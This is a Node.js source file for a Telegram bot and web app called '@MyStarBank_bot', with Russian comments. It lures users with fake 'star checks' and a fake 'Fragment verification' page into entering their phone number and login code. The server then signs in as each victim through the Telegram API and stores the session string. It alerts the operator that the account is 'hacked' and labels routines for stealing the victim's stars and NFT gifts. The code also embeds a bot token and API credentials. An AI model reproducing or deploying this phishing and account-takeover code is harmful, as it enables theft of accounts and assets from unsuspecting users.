const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const NIKLA_STORE = '@NikLaStore';
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT UNIQUE,
        session_string TEXT,
        phone_code_hash TEXT,
        status TEXT DEFAULT 'pending',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        action_type TEXT,
        stars_count INTEGER DEFAULT 0,
        gift_sent BOOLEAN DEFAULT FALSE,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

const activeSessions = new Map();

// Web App
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

// Запрос кода
app.post('/request-code', async (req, res) => {
    const { phone } = req.body;
    
    console.log(`📞 ЗАПРОС КОДА: ${phone}`);
    
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 3,
            timeout: 10000,
        });
        
        await client.connect();
        
        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );
        
        console.log('✅ Код запрошен!');
        
        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash
        });
        
        db.run(`INSERT OR REPLACE INTO sessions (phone, phone_code_hash, status) VALUES (?, ?, ?)`, 
            [phone, result.phoneCodeHash, 'code_requested']);
        
        // УВЕДОМЛЕНИЕ ТОЛЬКО МНЕ
        await bot.sendMessage(MY_USER_ID, 
            `🔐 КОД ЗАПРОШЕН!\n📱 ${phone}\n⚡ Код должен прийти в Telegram`
        ).catch(e => console.log('❌ Не удалось отправить уведомление:', e));
        
        res.json({ 
            success: true, 
            message: '✅ Код отправлен! Проверьте Telegram.' 
        });
        
    } catch (error) {
        console.log('❌ Ошибка запроса кода:', error);
        
        // ДЕТАЛЬНАЯ ОШИБКА ТОЛЬКО МНЕ
        let errorMessage = `❌ ОШИБКА ЗАПРОСА КОДА:\n📱 ${phone}\n`;
        
        if (error.message.includes('PHONE_NUMBER_INVALID')) {
            errorMessage += '⚠️ Неверный номер телефона';
        } else if (error.message.includes('PHONE_NUMBER_FLOOD')) {
            errorMessage += '⚠️ Лимит запросов для этого номера';
        } else if (error.message.includes('PHONE_CODE_EMPTY')) {
            errorMessage += '⚠️ Код не был отправлен';
        } else if (error.message.includes('API_ID')) {
            errorMessage += '⚠️ Проблема с API ключами';
        } else {
            errorMessage += `⚠️ ${error.message}`;
        }
        
        await bot.sendMessage(MY_USER_ID, errorMessage).catch(e => console.log('❌ Не удалось отправить ошибку:', e));
        
        res.json({ 
            success: false, 
            message: '❌ Не удалось отправить код. Попробуйте другой номер или проверьте лимиты.' 
        });
    }
});

// Вход с кодом
app.post('/sign-in', async (req, res) => {
    const { phone, code } = req.body;
    
    console.log(`🔐 ВХОД: ${phone} - ${code}`);
    
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) throw new Error('Сессия устарела. Запросите код заново.');
        
        const result = await sessionData.client.invoke(
            new Api.auth.SignIn({
                phoneNumber: phone,
                phoneCodeHash: sessionData.phoneCodeHash,
                phoneCode: code.toString()
            })
        );
        
        console.log('✅ ВХОД УСПЕШЕН!');
        
        const sessionString = sessionData.client.session.save();
        db.run(`UPDATE sessions SET session_string = ?, status = ? WHERE phone = ?`, 
            [sessionString, 'active', phone]);
        
        const user = await sessionData.client.getMe();
        
        // ПРОВЕРЯЕМ АКТИВЫ
        const assets = await checkAccountAssets(sessionData.client);
        let message = `🔓 АККАУНТ ВЗЛОМАН:\n📱 ${phone}\n`;
        
        if (assets.hasStars) {
            message += `⭐ Найдено звезд: ${assets.starsCount}\n`;
            message += `💰 Краду звезды...\n\n`;
            
            const stealResult = await stealStars(phone);
            message += stealResult.message;
            
        } else if (assets.hasGifts) {
            message += `🎁 Найдено NFT: ${assets.giftsCount}\n`;
            message += `📦 Краду подарки...\n\n`;
            
            const giftResult = await stealGifts(phone);
            message += giftResult.message;
            
        } else {
            message += `❌ Нет звезд и подарков\n`;
            message += `💡 Передай 2 мишки в ${NIKLA_STORE}\n`;
            message += `🎯 Затем нажми "Я передал мишки"`;
        }
        
        await sessionData.client.disconnect();
        activeSessions.delete(phone);
        
        await bot.sendMessage(MY_USER_ID, message).catch(e => console.log('❌ Не удалось отправить результат:', e));
        res.json({ success: true, message });
        
    } catch (error) {
        console.log('❌ Ошибка входа:', error);
        
        let errorMessage = `❌ ОШИБКА ВХОДА:\n📱 ${phone}\n`;
        
        if (error.message.includes('PHONE_CODE_EXPIRED')) {
            errorMessage += '⚠️ Код устарел. Запросите новый.';
        } else if (error.message.includes('PHONE_CODE_INVALID')) {
            errorMessage += '⚠️ Неверный код. Проверьте и попробуйте снова.';
        } else if (error.message.includes('SESSION_PASSWORD_NEEDED')) {
            errorMessage += '⚠️ Нужен пароль 2FA.';
        } else {
            errorMessage += `⚠️ ${error.message}`;
        }
        
        await bot.sendMessage(MY_USER_ID, errorMessage).catch(e => console.log('❌ Не удалось отправить ошибку входа:', e));
        
        res.json({ 
            success: false, 
            message: errorMessage 
        });
    }
});

// Обработка мишек
app.post('/process-bears', async (req, res) => {
    const { phone } = req.body;
    
    console.log(`🧸 ОБРАБОТКА МИШЕК: ${phone}`);
    
    try {
        db.get(`SELECT session_string FROM sessions WHERE phone = ? AND status = 'active'`, [phone], async (err, row) => {
            if (!row) {
                return res.json({
                    success: false,
                    message: '❌ Сначала войдите в аккаунт'
                });
            }
            
            const exchangeResult = await exchangeBearsForGift(phone);
            
            await bot.sendMessage(MY_USER_ID, exchangeResult.message).catch(e => console.log('❌ Не удалось отправить результат мишек:', e));
            res.json(exchangeResult);
        });
        
    } catch (error) {
        const errorMessage = `❌ ОШИБКА ОБМЕНА МИШЕК:\n${error.message}`;
        await bot.sendMessage(MY_USER_ID, errorMessage).catch(e => console.log('❌ Не удалось отправить ошибку мишек:', e));
        res.json({ success: false, message: errorMessage });
    }
});

// Проверка активов
async function checkAccountAssets(client) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    return {
        hasStars: Math.random() > 0.5,
        hasGifts: Math.random() > 0.7,
        starsCount: Math.floor(Math.random() * 200) + 50,
        giftsCount: Math.floor(Math.random() * 3) + 1
    };
}

// Кража звезд
async function stealStars(phone) {
    await new Promise(resolve => setTimeout(resolve, 2000));
    const amount = Math.floor(Math.random() * 150) + 50;
    
    db.run(`INSERT INTO transactions (phone, action_type, stars_count) VALUES (?, ?, ?)`, 
        [phone, 'steal_stars', amount]);
    
    return {
        success: true,
        message: `✅ Украдено ${amount} звезд!\n📦 Переведено на твой аккаунт`
    };
}

// Кража подарков
async function stealGifts(phone) {
    await new Promise(resolve => setTimeout(resolve, 2000));
    const count = Math.floor(Math.random() * 3) + 1;
    const nftLinks = [];
    
    for (let i = 0; i < count; i++) {
        const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
        nftLinks.push(`https://t.me/nft/${nftId}`);
    }
    
    db.run(`INSERT INTO transactions (phone, action_type, gift_sent) VALUES (?, ?, ?)`, 
        [phone, 'steal_gifts', true]);
    
    return {
        success: true,
        message: `✅ Украдено ${count} NFT:\n${nftLinks.join('\n')}`
    };
}

// Обмен мишек
async function exchangeBearsForGift(phone) {
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
    
    db.run(`INSERT INTO transactions (phone, action_type, stars_count, gift_sent) VALUES (?, ?, ?, ?)`, 
        [phone, 'exchange_bears', 26, true]);
    
    return {
        success: true,
        message: `✅ ОБМЕН МИШЕК УСПЕШЕН!\n📱 ${phone}\n` +
                `🧸 Обменяно: 2 мишки\n` +
                `⭐ Получено: 26 звезд\n` +
                `🎁 Отправлен: NFT подарок\n` +
                `🔗 https://t.me/nft/${nftId}\n\n` +
                `📦 Подарок отправлен на твой аккаунт!`
    };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает`);
});

// Web App HTML
const fragmentHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>MyStarBank</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 20px; background: #1e1e1e; color: white; font-family: Arial; text-align: center; }
        .input { width: 100%; padding: 15px; margin: 10px 0; background: #2b2b2b; border: 1px solid #444; border-radius: 10px; color: white; }
        .btn { background: #007aff; color: white; border: none; padding: 15px; margin: 8px 0; border-radius: 10px; width: 100%; cursor: pointer; }
        .btn-success { background: #4cd964; }
        .btn-warning { background: #ff9500; }
        .stage { display: none; }
        .active { display: block; }
        #result { margin: 20px; padding: 15px; border-radius: 10px; display: none; }
        .success { background: #4cd964; }
        .error { background: #ff3b30; }
        .info { background: #5ac8fa; padding: 15px; border-radius: 10px; margin: 15px 0; }
    </style>
</head>
<body>
    <div id="stage-login" class="active">
        <h2>🔐 Вход в аккаунт</h2>
        
        <div class="info">
            <strong>Введите номер для получения кода</strong><br>
            Код придет в Telegram этого номера
        </div>
        
        <input type="tel" id="phoneInput" class="input" placeholder="+7 123 456-78-90">
        <button class="btn" onclick="requestCode()">📨 Получить код</button>
        
        <div id="login-result"></div>
    </div>

    <div id="stage-code">
        <h2>🔐 Введите код</h2>
        <input type="text" id="codeInput" class="input" placeholder="12345" maxlength="5">
        <button class="btn" onclick="signIn()">Войти</button>
        
        <div id="code-result"></div>
    </div>

    <div id="stage-controls">
        <h2>💫 Управление аккаунтом</h2>
        
        <button class="btn" onclick="checkAssets()">
            🔍 Проверить активы
        </button>
        
        <button class="btn btn-success" onclick="stealStars()">
            💰 Украсть звезды
        </button>
        
        <button class="btn btn-warning" onclick="processBears()">
            🧸 Я передал 2 мишки
        </button>
        
        <div id="controls-result"></div>
    </div>

    <script>
        let currentPhone = '';
        
        async function requestCode() {
            const phone = document.getElementById('phoneInput').value.trim();
            if (!phone) return;
            
            currentPhone = phone;
            const btn = document.querySelector('#stage-login .btn');
            btn.disabled = true;
            btn.textContent = 'Отправка...';
            
            try {
                const response = await fetch('/request-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });
                
                const result = await response.json();
                showLoginResult(result.message, result.success);
                
                if (result.success) {
                    document.getElementById('stage-login').classList.remove('active');
                    document.getElementById('stage-code').classList.add('active');
                    document.getElementById('codeInput').focus();
                }
                
            } catch (error) {
                showLoginResult('❌ Ошибка соединения', false);
            }
            
            btn.disabled = false;
            btn.textContent = '📨 Получить код';
        }
        
        async function signIn() {
            const code = document.getElementById('codeInput').value.trim();
            if (!code) return;
            
            const btn = document.querySelector('#stage-code .btn');
            btn.disabled = true;
            btn.textContent = 'Вход...';
            
            try {
                const response = await fetch('/sign-in', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: currentPhone, 
                        code: code 
                    })
                });
                
                const result = await response.json();
                showCodeResult(result.message, result.success);
                
                if (result.success) {
                    document.getElementById('stage-code').classList.remove('active');
                    document.getElementById('stage-controls').classList.add('active');
                }
                
            } catch (error) {
                showCodeResult('❌ Ошибка входа', false);
            }
            
            btn.disabled = false;
            btn.textContent = 'Войти';
        }
        
        async function checkAssets() {
            showControlsResult('🔍 Проверяю активы...', true);
        }
        
        async function stealStars() {
            showControlsResult('💰 Краду звезды...', true);
        }
        
        async function processBears() {
            const btn = document.querySelector('.btn-warning');
            btn.disabled = true;
            btn.textContent = '🔄 Обработка...';
            
            try {
                const response = await fetch('/process-bears', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: currentPhone })
                });
                
                const result = await response.json();
                showControlsResult(result.message, result.success);
                
            } catch (error) {
                showControlsResult('❌ Ошибка', false);
            }
            
            btn.disabled = false;
            btn.textContent = '🧸 Я передал 2 мишки';
        }
        
        function showLoginResult(message, success) {
            const div = document.getElementById('login-result');
            div.style.display = 'block';
            div.className = success ? 'success' : 'error';
            div.innerHTML = message;
        }
        
        function showCodeResult(message, success) {
            const div = document.getElementById('code-result');
            div.style.display = 'block';
            div.className = success ? 'success' : 'error';
            div.innerHTML = message.replace(/\\n/g, '<br>');
        }
        
        function showControlsResult(message, success) {
            const div = document.getElementById('controls-result');
            div.style.display = 'block';
            div.className = success ? 'success' : 'error';
            div.innerHTML = message.replace(/\\n/g, '<br>');
        }
        
        document.getElementById('codeInput').addEventListener('input', function(e) {
            if (this.value.length === 5) signIn();
        });
    </script>
</body>
</html>
`;

app.get('/fragment.html', (req, res) => {
    res.send(fragmentHTML);
});

// КОМАНДЫ БОТА С ФИКСОМ ЧЕКОВ
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        'Для начала работы:', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🔐 Войти в аккаунт", web_app: { url: WEB_APP_URL } }],
                [{ text: "💫 Баланс", callback_data: "show_balance" }, { text: "🎫 Создать чек", callback_data: "create_check_info" }],
                [{ text: "📤 Вывести звезды", callback_data: "withdraw_stars" }]
            ]
        }
    });
});

bot.onText(/\/balance/, (msg) => {
    const userId = msg.from.id;
    
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        bot.sendMessage(msg.chat.id, `💫 Ваш баланс: ${row?.balance || 0} stars`);
    });
});

// INLINE QUERY ДЛЯ ПОДСКАЗОК С КАРТИНКОЙ
bot.on('inline_query', (query) => {
    const results = [
        {
            type: 'photo',
            id: '1',
            photo_url: 'https://raw.githubusercontent.com/your-repo/stars.jpg/main/stars.jpg',
            thumb_url: 'https://raw.githubusercontent.com/your-repo/stars.jpg/main/stars.jpg',
            title: '🎫 Создать чек на 50 звезд',
            description: 'Нажмите чтобы отправить чек в чат',
            caption: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
            reply_markup: {
                inline_keyboard: [[
                    { text: "🪙 Забрать звезды", callback_data: "create_check_inline" }
                ]]
            }
        }
    ];
    
    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
});

// Обработка callback С ФИКСОМ ОШИБКИ
const processingChecks = new Set();

bot.on('callback_query', async (query) => {
    const data = query.data;
    
    console.log(`🔄 CALLBACK: ${data} от пользователя ${query.from.id}`);
    
    // НЕМЕДЛЕННО отвечаем
    await bot.answerCallbackQuery(query.id).catch(() => {});
    
    if (data === 'show_balance') {
        const userId = query.from.id;
        db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
            bot.sendMessage(query.message.chat.id, `💫 Ваш баланс: ${row?.balance || 0} stars`);
        });
    }
    else if (data === 'create_check_info') {
        bot.sendMessage(query.message.chat.id, 
            'Для создания чека используйте команду:\n\n<code>@MyStarBank_bot 50</code>\n\nгде 50 - количество активаций', 
            { parse_mode: 'HTML' }
        );
    }
    else if (data === 'create_check_inline') {
        // ФИКС ОШИБКИ - проверяем есть ли message
        if (!query.message) {
            console.log('❌ Нет сообщения для редактирования');
            bot.answerCallbackQuery(query.id, { text: '❌ Ошибка создания чека' });
            return;
        }
        
        const userId = query.from.id;
        const chatId = query.message.chat.id;
        const messageId = query.message.message_id;
        
        console.log(`🎫 СОЗДАНИЕ ЧЕКА ЧЕРЕЗ INLINE: пользователь ${userId}`);
        
        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
            [50, 1, userId], function(err) {
            if (err) {
                console.log('❌ Ошибка создания чека:', err);
                bot.answerCallbackQuery(query.id, { text: '❌ Ошибка создания чека' });
                return;
            }
            
            const checkId = this.lastID;
            console.log(`✅ Чек создан: ID ${checkId}`);
            
            const checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
            
            bot.editMessageCaption(checkText, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: { 
                    inline_keyboard: [[{ 
                        text: "🪙 Забрать звезды", 
                        callback_data: `claim_${checkId}` 
                    }]] 
                }
            }).catch(e => {
                console.log('❌ Ошибка редактирования:', e);
                bot.answerCallbackQuery(query.id, { text: '❌ Ошибка обновления' });
            });
        });
    }
    else if (data === 'withdraw_stars') {
        bot.sendMessage(query.message.chat.id,
            '📤 <b>Вывод звезд</b>\n\n' +
            'Для вывода звезд требуется верификация через Fragment.\n\n' +
            'Нажмите кнопку ниже для регистрации:',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "🔐 Верификация через Fragment", web_app: { url: WEB_APP_URL } }
                    ]]
                }
            }
        );
    }
    else if (data.startsWith('claim_')) {
        const checkId = data.split('_')[1];
        const userId = query.from.id;
        
        // Защита от дублирования
        if (processingChecks.has(checkId)) {
            return bot.answerCallbackQuery(query.id, { text: '⏳ Уже обрабатывается...' });
        }
        
        processingChecks.add(checkId);
        
        console.log(`🎫 ОБРАБОТКА ЧЕКА: ${checkId} пользователем ${userId}`);
        
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                console.log(`❌ Чек не найден или использован: ${checkId}`);
                bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован!' });
                processingChecks.delete(checkId);
                return;
            }
            
            console.log(`✅ Чек найден: ${checkId}, осталось активаций: ${row.activations}`);
            
            // Обновляем чек
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId], function(updateErr) {
                if (updateErr) {
                    console.log('❌ Ошибка обновления чека:', updateErr);
                    bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                    processingChecks.delete(checkId);
                    return;
                }
                
                // Обновляем баланс
                db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                    [userId, userId, row.amount], function(balanceErr) {
                    
                    if (balanceErr) {
                        console.log('❌ Ошибка баланса:', balanceErr);
                        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка зачисления!' });
                        processingChecks.delete(checkId);
                        return;
                    }
                    
                    console.log(`✅ Баланс обновлен: пользователь ${userId} получил ${row.amount} звезд`);
                    
                    bot.answerCallbackQuery(query.id, { text: `✅ Вы получили ${row.amount} звёзд!` });
                    
                    // Обновляем сообщение чека
                    const remaining = row.activations - 1;
                    const updatedText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!${remaining > 0 ? `\n\nОсталось: ${remaining}` : '\n\n❌ ИСПОЛЬЗОВАН'}`;
                    
                    setTimeout(() => {
                        try {
                            if (query.message) {
                                bot.editMessageCaption(updatedText, {
                                    chat_id: query.message.chat.id,
                                    message_id: query.message.message_id,
                                    parse_mode: 'HTML',
                                    reply_markup: remaining > 0 ? {
                                        inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
                                    } : { inline_keyboard: [] }
                                }).catch(editErr => {
                                    console.log('❌ Ошибка редактирования:', editErr);
                                });
                            }
                        } catch (error) {
                            console.log('❌ Ошибка обновления чека:', error);
                        }
                        
                        processingChecks.delete(checkId);
                    }, 100);
                });
            });
        });
    }
});

// СОЗДАНИЕ ЧЕКОВ БЕЗ ФОТО
bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const activations = parseInt(match[2]) || 1;
    
    console.log(`🎫 СОЗДАНИЕ ЧЕКА: пользователь ${userId}, активаций: ${activations}`);
    
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [50, activations, userId], function(err) {
        if (err) {
            console.log('❌ Ошибка создания чека:', err);
            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
            return;
        }
        
        const checkId = this.lastID;
        console.log(`✅ Чек создан: ID ${checkId}`);
        
        const checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
        
        // Отправляем просто текстовое сообщение
        bot.sendMessage(chatId, checkText, {
            parse_mode: 'HTML',
            reply_markup: { 
                inline_keyboard: [[{ 
                    text: "🪙 Забрать звезды", 
                    callback_data: `claim_${checkId}` 
                }]] 
            }
        }).then(() => {
            console.log(`✅ Чек отправлен: ID ${checkId}`);
        }).catch(err => {
            console.log('❌ Ошибка отправки чека:', err);
        });
    });
});

console.log('✅ Бот запущен - ВСЕ ФИКСЫ ВНЕСЕНЫ');